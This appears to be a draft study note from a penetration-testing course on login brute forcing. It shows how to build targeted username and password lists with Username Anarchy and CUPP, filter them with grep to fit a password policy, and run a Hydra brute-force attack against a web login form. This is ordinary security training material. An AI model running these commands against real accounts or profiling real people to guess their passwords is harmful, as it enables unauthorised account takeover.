Custom Wordlists
###################

Date: 2025-01-11 15:26:12

Status: #draft

Tags: :ref:`certified penetration tester`, :ref:`login brute forcing`

----

Description
***************

Generic lists can be time consuming and may yield less than desired results.  In most cases you are going to want to create your own 
based on the engagement.

Tools
******

Username Anarchy
==================

Description
-------------
Username construction can be unpredictable, to assist with a username list this tool is very valuable.

Installation
--------------

.. code-block:: bash

    Temen@htb[/htb]$ sudo apt install ruby -y
    Temen@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
    Temen@htb[/htb]$ cd username-anarchy

Usage
--------

Creating a word list for a target user 

.. code-block:: bash

    username-anarchy Jane Smith > jane_smith_usernames.txt

Examine this list afterwards and appreciate the greatness :)
 

CUPP 
======

Description
--------------

(Common Username Password Profiler) - This tool uses online targets such as social media and web sites to create custom lists. 



Installation 
---------------

.. code-block:: bash

    Temen@htb[/htb]$ sudo apt install cupp -y

Usage
-------

.. code-block:: bash

    Temen@htb[/htb]$ cupp -i

    ___________
    cupp.py!                 # Common
        \                     # User
        \   ,__,             # Passwords
            \  (oo)____         # Profiler
            (__)    )\
                ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                                [ Mebus | https://github.com/Mebus/]


Filtering lists with password policy
***************************************

Given the following password policy:

- Minimum Length: 6 characters
- At least one uppercase letter
- At least one lowercase letter
- At least one number
- At least two special characters (from the set !@#$%^&*)

We can filter the list like this using grep 

.. code-block:: bash

    Temen@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt


Using Hydra to attack a web service
**************************************

As an example, we can take the two new lists and apply them to hydra against a web form target. 

.. code-block:: bash

    Temen@htb[/htb]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"


References
**************

https://academy.hackthebox.com/module/57/section/3209